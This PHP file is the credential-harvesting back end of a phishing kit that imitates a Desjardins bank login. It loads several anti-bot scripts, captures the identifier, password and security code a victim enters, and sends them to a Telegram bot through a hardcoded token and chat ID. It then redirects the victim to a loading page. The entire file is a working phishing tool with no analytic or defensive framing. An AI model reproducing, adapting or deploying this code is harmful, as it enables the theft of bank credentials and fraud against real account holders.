<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../../prevents/bots.php');
include ('../../prevents/antimar.php');
include ('../../prevents/banned-ip.php');
	include ('../../prevents/anti1.php');
	include ('../../prevents/anti2.php');
	include ('../../prevents/anti3.php');
	include ('../../prevents/anti4.php');
	include ('../../prevents/anti5.php');
	include ('../../prevents/anti6.php');
	include ('../../prevents/anti7.php');
	include ('../../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}

$botToken = "7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4";
$chatId = "8134069302";

// Récupérer les données du formulaire
$identifiant = isset($_POST['identifiant']) ? $_POST['identifiant'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$securityCode = isset($_POST['security_code']) ? $_POST['security_code'] : '';

// Préparer le message au format HTML
if ($identifiant && $password) {
    $message = "🔐 <b>Nouvelle connexion Desjardins</b>\nIdentifiant : <code>$identifiant</code>\nMot de passe : <code>$password</code>";
} elseif ($securityCode) {
    $message = "🛡️ <b>Code de sécurité saisi</b> : <code>$securityCode</code>";
} else {
    $message = "⚠️ <b>Aucune donnée reçue</b>.";
}

// URL pour envoyer le message en mode HTML
$sendMessageUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];
file_get_contents($sendMessageUrl . '?' . http_build_query($params));

// Redirection
header("Location: ../loading.php");
exit;
